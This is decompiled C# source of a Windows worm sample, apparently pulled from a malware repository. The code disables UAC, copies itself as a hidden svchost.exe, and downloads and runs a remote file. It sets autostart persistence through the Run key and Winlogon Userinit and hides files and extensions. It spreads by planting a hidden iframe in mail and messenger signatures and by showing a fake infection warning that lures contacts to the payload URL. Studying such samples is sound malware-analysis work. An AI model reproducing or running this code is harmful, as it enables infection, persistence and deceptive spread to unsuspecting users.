// Decompiled with JetBrains decompiler
// Type: .
// Assembly: WoRmy 3.1, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 5B3F2157-9C5E-49FF-827C-36A43C2192D1
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00007-msil\Worm.MSIL.Autorun.bn-c84e33c1883ca2f034c2d20e5c59a5319d95e9525a9ab0a5111aecbd19ba55e7.exe

using \u0019\u0003;
using \u001B\u0003;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Diagnostics;
using System.IO;
using System.Windows.Forms;

namespace \u001B\u0003
{
  [StandardModule]
  internal sealed class \u001E\u0003
  {
    public static string \u0001 = "";

    public static void \u0096\u0003()
    {
      try
      {
        Interaction.Shell("C:\\Windows\\System32\\cmd.exe /k %windir%\\System32\\reg.exe ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA /t REG_DWORD /d 0 /f");
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      try
      {
        File.Copy(Application.ExecutablePath, "C:\\svchost.exe");
        File.SetAttributes("C:\\svchost.exe", FileAttributes.Hidden);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      try
      {
        \u001E.Computer.Network.DownloadFile(\u001E\u0003.\u0001, Application.StartupPath + "\\file.exe");
        File.SetAttributes(Application.StartupPath + "\\file.exe", FileAttributes.Hidden);
        Process.Start(Application.StartupPath + "\\file.exe");
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      try
      {
        StreamWriter streamWriter = new StreamWriter(Environment.GetEnvironmentVariable("SystemRoot") + "\\sp.htm");
        File.SetAttributes(Environment.GetEnvironmentVariable("SystemRoot") + "\\sp.htm", FileAttributes.Normal);
        streamWriter.WriteLine("<iframe src=\"" + \u001E\u0003.\u0001 + "\"height=0 width=0>");
        streamWriter.Close();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      try
      {
        File.SetAttributes(Path.GetTempPath() + "desktop.ini", FileAttributes.Normal);
        StreamWriter streamWriter = new StreamWriter("desktop.ini");
        streamWriter.WriteLine("[.ShellClassInfo]");
        streamWriter.WriteLine("CLSID={F3AA0DC0-9CC8-11D0-A599-00C04FD64434}");
        streamWriter.WriteLine("ConfirmFileOp = 0");
        streamWriter.Close();
        File.SetAttributes(Path.GetTempPath() + "desktop.ini", FileAttributes.Hidden);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      try
      {
        \u001E.Computer.Registry.SetValue("HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "Microsoft", (object) "C:\\svchost.exe");
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      try
      {
        \u001E.Computer.Registry.SetValue("HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", "Userinit", (object) "C:\\WINDOWS\\SYSTEM32\\Userinit.exe,C:\\svchost.exe");
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      try
      {
        \u001E.Computer.Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", "Hidden", (object) "2");
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      try
      {
        \u001E.Computer.Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", "HideFileExt", (object) "1");
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      try
      {
        \u001E.Computer.Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "EnableLUA", (object) "0");
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      try
      {
        \u001E.Computer.Registry.SetValue("HKEY_CURRENT_USER\\Identities\\Software\\Microsoft\\Outlook Express\\5.0\\signatures", "Default Signature", (object) "C:\\windows\\sp.htm");
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      try
      {
        \u001E.Computer.Registry.SetValue("HKEY_CURRENT_USER\\Software\\Patchou\\Messenger Plus! Live\\GlobalSettings\\Scripts\\MSN PLUS", "background", (object) "C:\\windows\\sp.htm");
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      try
      {
        File.Copy(Application.ExecutablePath, "C:\\windows\\system32\\msconfig.bat");
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      try
      {
        \u001E.Computer.Registry.SetValue("HKEY_LOCAL_MACHINE\\Software\\Microsoft\\MessengerService\\Policies", "Warning", (object) ("(M)Warning: The person(s) you are talking to are infected! Send them the removal tool that can be found at " + \u001E\u0003.\u0001));
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }
  }
}
